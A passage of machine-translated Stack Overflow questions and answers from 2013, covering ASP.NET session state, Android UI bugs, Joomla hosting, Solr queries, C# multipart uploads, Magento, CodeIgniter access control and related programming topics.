`SERVICE`将文件放入内存后，您可以立即关闭。尽快释放文件等资源是个好主意。如果您决定不删除整个文件（这可能会更好，特别是如果标记文本出现在大文件的开头附近），那么您将`foreach`循环替换为`while (<SERVICE>)`或类似的东西。

# c# - httpContext.Current.Session 为空（WebService 内部）Asp.net

> ID：15738821
> 
> 赞同：-1
> 
> 时间：2013-04-01T06:39:47.483
> 
> 标签：c#, asp.net, web-services, session

我有一个网络服务。我在该服务中使用了一些会话变量。

## 代码：

```
[WebMethod(EnableSession = true)]
public static string UploadFiles_Local(Dictionary<int, string> accFile)
{
    string FilePath = "";
    Dictionary<int, string> dicStatus = new Dictionary<int, string>();
    Dictionary<int, string> dicUpload = new Dictionary<int, string>();

    System.Web.HttpContext.Current.Session["uLocal"] = System.Web.HttpContext.Current.Server.MapPath("UplodedFiles") + "\\" + DateTime.Now.Ticks.ToString();

    foreach (var f_l in accFile)
    {
        FilePath = f_l.Value;
        string fName = FilePath.Substring(FilePath.LastIndexOf("\\") + 1, FilePath.Length - FilePath.LastIndexOf("\\") + 1);

        //File reading
        FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
        //Directory Existens checking
        if (!Directory.Exists(System.Web.HttpContext.Current.Session["uLocal"].ToString()))
        {
            Directory.CreateDirectory(System.Web.HttpContext.Current.Session["uLocal"].ToString());
        }
        try
        {
            //Upload files
            long FileSize = new FileInfo(FilePath).Length; // File size of file being uploaded.
            string uploadFileName = new FileInfo(FilePath).Name; // File name

            Byte[] buffer = new Byte[FileSize];
            fs.Read(buffer, 0, buffer.Length);
            fs.Close();
            fs = null;

            fs = File.Open(System.Web.HttpContext.Current.Session["uLocal"].ToString() + "\\" + fName, FileMode.OpenOrCreate);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(buffer);
            bw.Close();

            dicStatus.Add(f_l.Key, "File " + fName + ". Successfuly uploded to:" + System.Web.HttpContext.Current.Session["uLocal"].ToString() + "\\" + fName);
            dicUpload.Add(f_l.Key, System.Web.HttpContext.Current.Session["uLocal"].ToString() + "\\" + fName);
        }
        catch (Exception ex)
        {
            if (fs != null)
            {
                fs.Close();
            }
            dicStatus.Add(f_l.Key, "File " + fName + ". Error in uploding to:" + System.Web.HttpContext.Current.Session["uLocal"].ToString() + "\\" + fName + "\r\nError :" + ex.Message);
        }
        finally
        {
            if (fs != null)
            {
                fs.Close();
            }
        }
    }
    if (dicUpload.Count > 0)
    {
        //Making rar of uploded files
        ClsClass.RarFilesT(System.Web.HttpContext.Current.Session["uLocal"].ToString() + ".rar", dicUpload);
        FilePath = System.Web.HttpContext.Current.Session["uLocal"].ToString() + ".rar";
    }
    else
    {
        FilePath = "Error";
    }
    return FilePath;
} 
```

我已经在该 Web 服务中启用了会话，但是仍然收到错误消息：-

## 错误信息：-

```
 'System.Web.HttpContext.Current' is null 
```

我还需要从 globle.ashx 文件中调用此服务。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:42:38.203

也许这可以帮助：

[http://www.codeproject.com/Articles/35119/Using-Session-State-in-a-Web-Service](http://www.codeproject.com/Articles/35119/Using-Session-State-in-a-Web-Service)

但是让我告诉你，Web 服务不应该存储任何会话状态，这是错误的。

# java - 我无法向我的应用程序中的下一个按钮添加功能。它应该在每次按下时更改文本。

> ID：15738822
> 
> 赞同：-1
> 
> 时间：2013-04-01T06:39:48.127
> 
> 标签：java, android, textview, android-button

我无法向我的应用程序中的下一个按钮添加功能。它应该在每次按下时更改文本。但是，就我而言，它所做的只是更改一次文本然后进入睡眠状态！我应该怎么办？我搜索了网站，但找不到任何方法！

### Java代码！

```
package com.dreamgoogle.gihf;

import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.widget.ImageButton;
import android.widget.TextView;

public class Quotes extends Activity {

    ImageButton next;
    ImageButton previous;
    ImageButton copytext;
    TextView q;
    TextView nm;
    String[] str;
    int i;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_quotes);
        varSet();

        next.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                int i = 0;
                i = i + 1;
                q.setText(str[i]);

            }

        });

    }

    private void varSet() {
        next = (ImageButton) findViewById(R.id.next);
        previous = (ImageButton) findViewById(R.id.previous);
        copytext = (ImageButton) findViewById(R.id.copy);
        q = (TextView) findViewById(R.id.quotes);
        str = new String[] {
                "In order to succeed, your desire for success should be greater than your fear of failure.",
                "A successful man is one who can lay a firm foundation with the bricks others have thrown at him.",
                "Success is not final, failure is not fatal: it is the courage to continue that counts.",
                "Try not to become a man of success. Rather become a man of value.",
                "Want Something? Go Get It!" };

    };

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.quotes, menu);
        return true;

    }

} 
```

### 布局文件

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@drawable/home"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context=".Quotes" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentTop="true"
        android:layout_centerHorizontal="true"
        android:text="@string/h1"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <TextView
        android:id="@+id/quotes"
        android:layout_width="300dp"
        android:layout_height="250dp"
        android:layout_centerInParent="true"
        android:background="@android:color/transparent"
        android:gravity="center_vertical|center_horizontal|top"
        android:text="@string/h2"
        android:textSize="12sp"
        android:typeface="monospace" />

    <ImageButton
        android:id="@+id/previous"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/quotes"
        android:layout_marginTop="14dp"
        android:layout_toLeftOf="@+id/textView1"
        android:background="@android:color/transparent"
        android:contentDescription="@drawable/previous"
        android:src="@drawable/previous" />

    <ImageButton
        android:id="@+id/next"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignTop="@+id/previous"
        android:layout_toRightOf="@+id/textView1"
        android:background="@android:color/transparent"
        android:contentDescription="@drawable/next"
        android:src="@drawable/next" />

    <ImageButton
        android:id="@+id/copy"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignTop="@+id/previous"
        android:layout_centerHorizontal="true"
        android:background="@android:color/transparent"
        android:contentDescription="@drawable/copy"
        android:src="@drawable/copy" />

    <TextView
        android:id="@+id/nm"
        android:layout_width="20dp"
        android:layout_height="wrap_content"
        android:layout_above="@+id/quotes"
        android:layout_centerHorizontal="true"
        android:layout_marginBottom="18dp"
        android:clickable="false"
        android:ems="10"
        android:text="@string/h3" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T06:40:54.400

改变：

```
@Override
public void onClick(View v) {
    int i = 0;
    i = i + 1;
    q.setText(str[i]);
} 
```

至

```
@Override
public void onClick(View v) {
    i = i + 1;
    q.setText(str[i]);
} 
```

通过`i`在 onClick() 方法中再次声明，您可以在 Activity 类中隐藏它。并且由于每次调用此方法，`i`总是重置为 0，因此您的文本将始终是`str[1]`

这称为[变量隐藏](http://www.xyzws.com/Javafaq/what-is-variable-hiding-and-shadowing/15)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:43:10.283

您在 onClick 中声明迭代器。单击时会发生什么：

1）您创建一个值为0的新int；

2) 0 = 0 + 1；

3) 每次都将 q 的文本设置为 str[1]。

将您的迭代器声明为 OnClickListener 或整个 Activity 本身的类变量。

# joomla - 将 joomla 网站移动到另一台主机但不起作用

> ID：15738823
> 
> 赞同：0
> 
> 时间：2013-04-01T06:40:01.177
> 
> 标签：joomla

我最近将我的 joomla 网站移动到另一个主机。但是现在这个网站不工作了。显示空白页。尽管管理员页面 (/administrator) 已显示并且可以正常工作。有什么想法可能是什么原因？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T07:59:33.093

1.  完全删除 .htaccess
2.  清除缓存和 tmp 文件夹
3.  确保 configuration.php 中的数据库名称、登录名和密码正确
4.  确保服务器路径（tmp 和日志文件夹）正确
5.  如果您仍然得到一个空白页面，请确保您正在查看正确的日志文件。打开 php 错误日志记录或显示它们。
6.  在此处发布更多详细信息...

# php - 如何从表格内容中获取记录作为弹出表单的数据并显示

> ID：15738827
> 
> 赞同：1
> 
> 时间：2013-04-01T06:40:21.230
> 
> 标签：php, javascript, html

我作为弹出按钮制作的表格内容。此弹出窗口具有输入表单的功能并链接到此处的另一个页面，例如我的表格

```
 <div>
  <table width="1023" height="248" border="1">
    <td><div align="center"><input type="button" onclick="popup_window_show('#sample', { pos : 'tag-right-down',   parent : this, width : '270px' });" value="A1.8" /></td>
  </table>
 </div> 
```

我的弹出表单是这样的

```
<div   class="popup_window_css" id="sample">
<table class="popup_window_css">
<tr    class="popup_window_css">
<td    class="popup_window_css">
<div   class="popup_window_css_head"><img src="images/close.gif" alt="" width="9" height="9" />Aksi</div>
<div   class="popup_window_css_body"><div style="border: 1px solid #808080; padding: 6px; background: #FFFFFF;">
<form method="post" action="">
<table>
    <tr>
     <td> Werehouse </td>
    <tr>
     <td> Posisi</td>
     <td> <input type='text' name="p" value="" /></td>
    </tr>
    <tr>
     <td> Product ID</td>
     <td> <input type='text' name="id" /></td>
    </tr>
    <tr>
     <td> Product Name</td>
     <td> <input type='text' name="nama" /></td>
    </tr>
    <tr>
     <td> Production Date</td>
     <td> <input type='text' name="tgl" /></td>
    </tr>
    <tr>
        <td colspan='2' align='right'>
         <input type='submit' value= 'Save'> 
         <input type='reset' value='Reset' />
         <input type='button' value='view' onclick=\"window.location.href='#';\"/>
         </td>
    </tr>
</table>
</div></div> 
```

可能这个屏幕截图可以帮助你理解我的问题

[https://www.dropbox.com/s/bwil302fdzhe0f5/New%20Picture%20%2829%29.bmp](https://www.dropbox.com/s/bwil302fdzhe0f5/New%20Picture%20%2829%29.bmp)

**我的问题**

如何获取按钮值作为弹出表单的数据并自动显示在“posisi”表单中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T09:42:30.433

tq 为 Ricky 这就是答案

```
<script>
    function setvalue(values) {
    document.getElementById('posisi').value = values;
}
</script>
<div>
    <table width="1023" height="248" border="1">
        <tr>
            <td>

                    <input type="button" onclick="setvalue(this.value);" value="A1.8" />
            </td>
        </tr>
    </table>
    </div>
    <div class="popup_window_css" id="sample">
        <table class="popup_window_css">
            <tr class="popup_window_css">
                <td class="popup_window_css">
                    <div class="popup_window_css_head">
                        <img src="images/close.gif" alt="" width="9" height="9" />Aksi</div>
                    <div class="popup_window_css_body">
                        <div style="border: 1px solid #808080; padding: 6px; background: #FFFFFF;">
                            <form method="post" action="">
                                <table>
                                    <tr>
                                        <td>Werehouse</td>
                                        <tr>
                                            <td>Posisi</td>
                                            <td>
                                                <input type='text' name="p" id="posisi" />
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Product ID</td>
                                            <td>
                                                <input type='text' name="id" />
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Product Name</td>
                                            <td>
                                                <input type='text' name="nama" />
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Production Date</td>
                                            <td>
                                                <input type='text' name="tgl" />
                                            </td>
                                        </tr>
                                        <tr>
                                            <td colspan='2' align='right'>
                                                <input type='submit' value='Save'>
                                                <input type='reset' value='Reset' />
                                                <input type='button' value='view' onclick=\ "window.location.href='#';\"/>
                                            </td>
                                        </tr>
                                </table>
                        </div>
                    </div> 
```

你可以在这里[http://jsfiddle.net/JLExZ/](http://jsfiddle.net/JLExZ/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:58:02.997

您可以使用 HTML5 数据属性概念在表单数据中设置值，例如通过 JavaScript 接收数据。

```
<div id="awesome" 
 data-hash="3e4ae6c4e30e50e4fdfc7bf439a09974">Some awesome data</div>

  var dataHashValue = jQuery("#awesome").data('hash');
     console.log(dataHashValue); 
```

# solr - 如何执行这些 SOLR 查询？

> ID：15738828
> 
> 赞同：0
> 
> 时间：2013-04-01T06:40:31.180
> 
> 标签：solr, solrj, edismax, dismax

我有一个索引数据（使用 rdbms 中的 solrj 索引），其中包含与银行相关的字段，例如（示例）：customerid、cust_name、accountno、amount、position、pos_value、EOD_value 等

现在我想对数据和搜索查询进行一些搜索：

*   前10名股票/仓位（根据股票价值）
*   银行存款金额降序排列的前5名客户
*   哪只股票一天内涨幅最大（以及股票详情）
*   特定时间范围内股票的最低值

如何在 SOLR 中查询上述内容我确实阅读了 Function Query 和 solr Plugins 但找不到太多有用的信息......

我们可以使用一些数学运算（如平均值、总和等）对字段（金额、股票价值等）进行分面吗？

我想使用速度 UI 进行以下搜索，需要对其搜索框进行哪些自定义？任何想法？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T08:21:21.570

Solr是一个**高性能的文本搜索引擎**，基于Lucene，一个优秀的**token匹配和评分库**。这就是说，您想要运行的那种查询肯定会以一种或另一种方式与 Solr 一起工作，但您必须向 Solr 提供您想要搜索的所有数据。Solr 不会为您计算最小、最大平均值。它的工作是在先前计算的值中尽可能快地查找、排名和排序。

您列出的字段可能无法为您提供所需的所有详细信息。您将需要索引更多。

如果您的索引中有您正在寻找的数据，那么以下查询可能会得到您正在寻找的答案，或者应该为您提供有关如何陈述它们的提示。

**前 10 名股票/仓位**

```
q=*:* sort=stock_value DESC rows=10 
```

这要求它`stock_value`是数字并且具有指数中的最新股票价格。

**前 5 名客户**

这很相似。

```
q=*:* sort=account_value DESC rows=5 
```

**哪只股票一天内涨幅最大**

您将需要索引每天的收益

```
q=date:1995-12-31T23:59:59.999Z sort=stock_gain  DESC rows=1 
```

**特定时间范围内股票的最低值**

```
q=symbol:abc123 date:[1995-12-31T23:59:59.999Z TO 2007-03-06T00:00:00Z]  sort=stock_value ASC rows=1 
```

有关日期查询的详细信息，请参阅[Solr 查询语法](http://wiki.apache.org/solr/SolrQuerySyntax)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-04T09:30:08.200

我们在我们的一个应用程序中实现了同样的事情。

在导航器“div”下的 Browse.vm 中，我们创建了自定义方面，当我们单击该方面时，它会重新创建 url 以及“phisch”在他的回答中提到的参数。

**示例：** 我们在 UI 的方面部分创建了一个名为“Top 10 Stocks”的链接，当我们单击它时。我们创建了一个 url 添加参数为

q= *:* &sort=stock_value DESC&rows=10

请在您的最后尝试一下，因为它在我的最后工作正常。抱歉，我不能分享代码，因为它是客户机密。

# java - 实现 HttpSession 时的弃用警告

> ID：15738830
> 
> 赞同：2
> 
> 时间：2013-04-01T06:40:41.963
> 
> 标签：java, servlets, httpsession

当我尝试实现 HttpSession 时，我应该重写`getSessionContext`方法。但它会导致不推荐使用的警告，因为该方法及其返回类型`HttpSessionContext`已被弃用。

`@deprecated`javadoc 标记修复了对定义的警告，`getSessionContext`但无法修复对`HttpSessionContext`. 在导入之前放置`@SuppressWarnings`会导致编译错误。

如何修复这两个警告？

代码：

```
import javax.servlet.http.HttpSession;
import javax.servlet.http.HttpSessionContext;

public class MyServletSession implements HttpSession {
    // ...

    /**
     * @deprecated
     */
    @Override
    public HttpSessionContext getSessionContext() {
        throw new UnsupportedOperationException();
    }

    // ...
} 
```

警告：

```
$ javac -Xlint:deprecation -cp /path/to/javax.servlet-api-3.0.1.jar MyServletSession.java
MyServletSession.java:5: warning: [deprecation] HttpSessionContext in javax.servlet.http has been deprecated
import javax.servlet.http.HttpSessionContext;
                                     ^
1 warning 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:09:37.220

如果您真的需要实现自己的`HttpSession`. 并禁止弃用警告，我相信正确的编译器参数是`-Xlint:-deprecation`. 注意`-`前面`deprecation`

编辑：这将删除所有弃用警告，因此如果您试图仅禁止该类中的警告，它可能不适合。相反，我发现这对我有用：

```
// Note, no import of javax.servlet.http.HttpSessionContext
import javax.servlet.http.HttpSession;

@SuppressWarnings("deprecation")
public class MySession implements HttpSession {

    /**
     * This javadoc comment, along with the fully qualified name of HttpSessionContex in the method signature seems to do the trick.
     * @deprecated
     */
    public javax.servlet.http.HttpSessionContext getSessionContext() {
    }

    //... All your other methods
} 
```

# linux - 本地安装 zlib

> ID：15738838
> 
> 赞同：2
> 
> 时间：2013-03-31T12:20:05.687
> 
> 标签：linux, path

我必须安装`zlib`软件才能在我的学院服务器上运行。我知道我可以`zlib`使用 .

```
/configure --prefix=/home/local/zlib 
```

我最终通过使用`make install`命令安装了它。现在我需要把它放在路径中以运行其他需要`zlib`. 如何设置路径？

我尝试使用命令使用导出路径，`export PATH="$PATH:/home/local/zlib"`但我相信我没有 root 访问权限，所以我无法设置它。有人可以告诉我任何解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-31T13:21:06.680

尝试设置`LD_LIBRARY_PATH`为 /home/local/zlib/lib 而不是`PATH`. 您应该能够运行导出命令，因为它只会影响您自己的会话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-06-24T06:49:12.547

您可以使用以下指令将 zlib 的符号链接添加到您的 PATH 中：

以下是有关将目录添加到 PATH 的一些信息：

PATH 变量可以通过键入来访问

```
$PATH 
```

或者，要逐行查看路径中的目录，请使用

```
sed 's/:/\n/g' <<< "$PATH" 
```

这些是 shell 将在其中查找您指定的可执行文件的所有目录。我喜欢将我手动安装的程序可执行文件的符号链接放在 /home/myusername/.local/bin

理论上，您可以将任何具有程序可执行文件的目录添加到您的 PATH 中，但如果您保留一个这样的所需目录，然后使用符号链接添加可执行文件，它会更容易/更干净，并且不太可能导致问题。

要将所需目录添加到 PATH，您必须编辑 ~/.bashrc 文件，并添加以下行： export PATH="$PATH:/path/to/desired/directory" 指定要添加到的目录PATH 的结尾。然后在 shell 中，使用 source 命令加载当前 shell 的新路径（启动新的 shell 会话也可以）：

```
source ~/.bashrc 
```

然后，要将可执行文件添加到此目录，您将需要使用符号链接或符号链接：

```
ln -s /path/to/executable /desired/path 
```

这是程序 BWA 的示例，其中可执行文件 bwa 位于名为 soft/bwa/ 的文件夹中：

```
ln -s /home/myusername/soft/bwa/bwa /home/myusername/.local/bin/bwa 
```

# android - Android OpenGL ES 2.0：无效的顶点着色器。链接无法继续

> ID：15738841
> 
> 赞同：0
> 
> 时间：2013-04-01T06:41:05.773
> 
> 标签：android, opengl-es, opengl-es-2.0, vertex-shader

这是我获得调试错误所能做的最好的事情。

![快照](https://i.stack.imgur.com/unXMS.png) [更大图像版本的链接](https://i.stack.imgur.com/unXMS.png)

可以看到，glGetProgramInfoLog() 返回如下语句：

*“无效的顶点着色器。链接无法继续。”*

Eclipse IDE 中的黄线是程序刚刚通过单步执行执行的代码行。带有箭头的绿线是程序将执行的地方。

如果它能告诉我我的顶点着色器代码在哪一行出错，或者能指出我正确的方向，我会更喜欢它。有了这个模糊的描述，我只能向你寻求帮助。

顶点着色器代码如下所示：

```
uniform mat4 u_mvpMatrix;
uniform mat4 u_mvMatrix;
uniform vec3 u_lightPosition;

attribute vec4 a_position;
attribute vec4 a_color;
attribute vec3 a_normal;

varying vec4 v_color;

void main() {
    vec3 modelViewVertex = vec3(u_mvMatrix * a_position);
    vec3 modelViewNormal = vec3(u_mvMatrix * vec4(a_normal, 0.0));

    float distance = length(u_lightPosition - modelViewVertex);
    vec3 lightVector = normalize(u_lightPosition - modelViewVertex);
    float diffuse = max(dot(modelViewNormal, lightVector), 0.1);
    diffuse = diffuse * (1.0 / (0.25 * distance * distance));

    v_color = a_color * diffuse;

    gl_Position = mvpMatrix * a_position;
} 
```

我不知道我哪里做错了。你能帮我找到吗？如果您需要更多信息，我会添加它们。提前致谢。

**编辑1：**

glGetShaderInfo() 没有调试信息。

![glGetShaderInfo() 什么也没给出。](https://i.stack.imgur.com/6aT4s.png) [更大的版本。](https://i.stack.imgur.com/6aT4s.png)

更多信息：

![字符串为空。](https://i.stack.imgur.com/mMk3U.png)

**编辑2：**

尝试了 glGetShader() 和 glGetShaderInfo() 的组合，仍然没有运气。

![混合 glGetShader() 和 glGetShaderInfo() 输出。](https://i.stack.imgur.com/H6hHM.png) [更大的版本。](https://i.stack.imgur.com/H6hHM.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T15:35:04.767

发现错误！

一直以来，我都在编辑错误的源文件！

一直保存/检查/保存/检查...，我没有意识到上面显示的源代码不包含在项目中，因此程序说明我的顶点着色器无效，是因为编译器正在编译源代码带有空顶点着色器的代码，而不是新修改的版本（这是我一直在编辑的源代码）。

很抱歉浪费大家的时间。

# c# - 在 C# 中使用 HTTP POST 发送文件

> ID：15738847
> 
> 赞同：22
> 
> 时间：2013-04-01T06:41:26.873
> 
> 标签：c#, file, web-applications, http-post

我有一个小型 C# Web 应用程序。如何获取允许用户通过 HTTP POST 发送文件的 c# 代码。它应该能够在不使用的情况下发送文本文件、图像文件、excel、csv、doc（所有类型的文件）流阅读器和所有。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-01T06:57:54.217

您可以尝试以下代码：

```
 public void PostMultipleFiles(string url, string[] files)
{
    string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
    httpWebRequest.ContentType = "multipart/form-data; boundary=" + boundary;
    httpWebRequest.Method = "POST";
    httpWebRequest.KeepAlive = true;
    httpWebRequest.Credentials = System.Net.CredentialCache.DefaultCredentials;
    Stream memStream = new System.IO.MemoryStream();
    byte[] boundarybytes =System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary     +"\r\n");
    string formdataTemplate = "\r\n--" + boundary + "\r\nContent-Disposition:  form-data; name=\"{0}\";\r\n\r\n{1}";
    string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\n Content-Type: application/octet-stream\r\n\r\n";
    memStream.Write(boundarybytes, 0, boundarybytes.Length);
    for (int i = 0; i < files.Length; i++)
    {
        string header = string.Format(headerTemplate, "file" + i, files[i]);
        //string header = string.Format(headerTemplate, "uplTheFile", files[i]);
        byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
        memStream.Write(headerbytes, 0, headerbytes.Length);
        FileStream fileStream = new FileStream(files[i], FileMode.Open,
        FileAccess.Read);
        byte[] buffer = new byte[1024];
        int bytesRead = 0;
        while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
        {
            memStream.Write(buffer, 0, bytesRead);
        }
        memStream.Write(boundarybytes, 0, boundarybytes.Length);
        fileStream.Close();
    }
    httpWebRequest.ContentLength = memStream.Length;
    Stream requestStream = httpWebRequest.GetRequestStream();
    memStream.Position = 0;
    byte[] tempBuffer = new byte[memStream.Length];
    memStream.Read(tempBuffer, 0, tempBuffer.Length);
    memStream.Close();
    requestStream.Write(tempBuffer, 0, tempBuffer.Length);
    requestStream.Close();
    try
    {
        WebResponse webResponse = httpWebRequest.GetResponse();
        Stream stream = webResponse.GetResponseStream();
        StreamReader reader = new StreamReader(stream);
        string var = reader.ReadToEnd();

    }
    catch (Exception ex)
    {
        response.InnerHtml = ex.Message;
    }
    httpWebRequest = null;
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-10-29T17:17:48.610

使用 .NET 4.5（或 .NET 4.0，通过从 NuGet 添加[Microsoft.Net.Http](http://nuget.org/Packages/Microsoft.Net.Http)包）有一种更简单的方法来模拟表单请求。这是一个例子：

```
private System.IO.Stream Upload(string actionUrl, string paramString, Stream paramFileStream, byte [] paramFileBytes)
{
    HttpContent stringContent = new StringContent(paramString);
    HttpContent fileStreamContent = new StreamContent(paramFileStream);
    HttpContent bytesContent = new ByteArrayContent(paramFileBytes);
    using (var client = new HttpClient())
    using (var formData = new MultipartFormDataContent())
    {
        formData.Add(stringContent, "param1", "param1");
        formData.Add(fileStreamContent, "file1", "file1");
        formData.Add(bytesContent, "file2", "file2");
        var response = client.PostAsync(actionUrl, formData).Result;
        if (!response.IsSuccessStatusCode)
        {
            return null;
        }
        return response.Content.ReadAsStreamAsync().Result;
    }
} 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-04-01T07:49:19.037

试试这个

```
string fileToUpload = @"c:\user\test.txt";
string url = "http://example.com/upload";
using (var client = new WebClient())
{
byte[] result = client.UploadFile(url, fileToUpload);
string responseAsString = Encoding.Default.GetString(result);
} 
```

# magento - 如何从 magento 中删除主题选项卡名称

> ID：15738850
> 
> 赞同：-2
> 
> 时间：2013-04-01T06:41:33.703
> 
> 标签：magento, themes

我在安装后使用 Queldorei 主题，它在系统选项卡旁边的顶部创建其自定义选项卡。我怎样才能删除这个？我不想删除主题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:56:18.677

只需转到主题模块 config.xml 文件，在此文件中找到`<menu>`标签并注释此`<menu>`标签

这样做后清除你的缓存，你就完成了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T13:12:16.880

You can either

1.  Comment out the `<menu>` in either `adminhtml.xml` or `config.xml`

2.  Removing it using `local.xml` or a custom module (if you want to avoid making changes to that modules) see [Magento remove "Promo" Item](https://stackoverflow.com/questions/12720431/magento-remove-promo-item)

# php - 为用户组实现动态分配的角色

> ID：15738852
> 
> 赞同：0
> 
> 时间：2013-04-01T06:41:40.643
> 
> 标签：php, codeigniter

我有一个包含以下字段的数据库：

*   ID
*   名
*   姓
*   电子邮件
*   电话
*   地址
*   信息
*   ...

为简单起见，假设我有三个用户组——用户、超级用户和管理员。

我寻找最好的设计（开发基于 PHP 的应用程序，基于 CodeIgniter），允许管理员为不同的用户组定义视野（用户组 A 应该有权访问字段 X、Y、Z），以及用户自己必须能够选择要查看的字段（从他的组中允许）。

这应该发生在后端，而不是前端..

有什么指导吗？

问候，克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T09:10:32.003

可能您会找到解决该问题的几种方法。这取决于需求以及功能在模块中的公开和分布方式。

在我的例子中，访问控制是在控制器的基础上给出的，所以我定义了可以检查构造函数中访问的抽象控制器，pe：

```
class User_Controller extends CI_Controller {

    public function __construct() 
    {

        parent::__construct();

        $this->auth->is_logged_in() || RedirectToLogin();
    }
}

class SuperUser_Controller extends User_Controller {

    public function __construct() 
    {

        parent::__construct();

        $this->auth->is_superuser() || RedirectToBadUser();
    }
}

class Admin_Controller extends User_Controller {

    public function __construct() 
    {

        parent::__construct();

        $this->auth->is_admin() || RedirectToBadUser();
    }
} 
```

您应该根据您的规格解决 is_logged_in、is_superuser() 和 is_admin()，然后根据所需级别使您的控制器基于其中之一。

无论如何，没有什么能阻止你`$this->auth->is_superuser() || RedirectToBadUser();`在方法内部添加一个，提供你需要的粒度。

# android - xml 布局未在 Android 中使用 LayoutInflater 的另一个 xml 布局中显示

> ID：15738862
> 
> 赞同：0
> 
> 时间：2013-04-01T06:42:23.143
> 
> 标签：android, layout-inflater

我正在尝试使用 LayoutInflater 在另一个 xml 布局中添加一个 xml 布局。但它没有显示。

请检查我的源代码。

```
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.webkit.WebView;
import android.widget.RelativeLayout;

public class CustomeWebView extends Activity {
RelativeLayout relLay;
WebView webview;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main_new);
    relLay = (RelativeLayout) findViewById(R.id.main_relLay);
    LayoutInflater inflater = (LayoutInflater) getApplication()
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    View v_child = inflater.inflate(R.layout.row, null);
    relLay.addView(v_child);
}
} 
```

主xml文件

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent" >

<ScrollView
    android:id="@+id/scrollview"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <RelativeLayout
        android:id="@+id/main_relLay"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:background="#0B7A3B" >
    </RelativeLayout>
</ScrollView>

</RelativeLayout> 
```

子xml文件

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical" >

<RelativeLayout
    android:id="@+id/row_relLay"
    android:layout_width="match_parent"
    android:layout_height="match_parent" 
    android:background="#F70925">

    <WebView
        android:id="@+id/row_webView"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" 
        android:visibility="gone">
    </WebView>
</RelativeLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T11:43:23.027

将该行添加`android:fillViewport="true"`到您的 ScrollView。它应该可以解决问题。

当设置为 true 时，如果需要，此属性会使滚动视图的子视图扩展到 ScrollView 的高度。当 child 高于 ScrollView 时，该属性不起作用。

笔记 ：

1.  您应该删除 main_new.xml 中 ScrollView 周围的 RelativeLayout
2.  您应该删除 row.xml 中的 RelativeLayout 周围的 LinearLayout

两者都是不必要的

# c++ - 是否有任何代表二叉树的 MFC / STL 类

> ID：15738863
> 
> 赞同：0
> 
> 时间：2013-04-01T06:42:31.890
> 
> 标签：c++, data-structures, stl, mfc, binary-tree

在 MFC 集合类中，我们有 Linked Lists、Maps、Dynamic Arrays...

但是有谁知道在 MFC（甚至在 STL）中是否有一个健康的类支持二叉树实现及其功能？

